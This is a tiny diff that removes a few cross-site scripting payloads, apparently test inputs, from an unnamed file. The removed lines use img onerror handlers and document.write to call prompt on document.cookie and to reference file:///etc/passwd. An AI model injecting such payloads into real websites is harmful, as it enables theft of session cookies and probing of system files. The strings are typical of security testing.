@@ -1,6 +1,0 @@
-document.write('<div src=file:///etc/passwd></div>')
-
-testaction<img/src/onerror=prompt(document.write(src=file:///etc/passwd))>
-
-
- testaction<img/src/onerror=prompt(document.cookie)> 
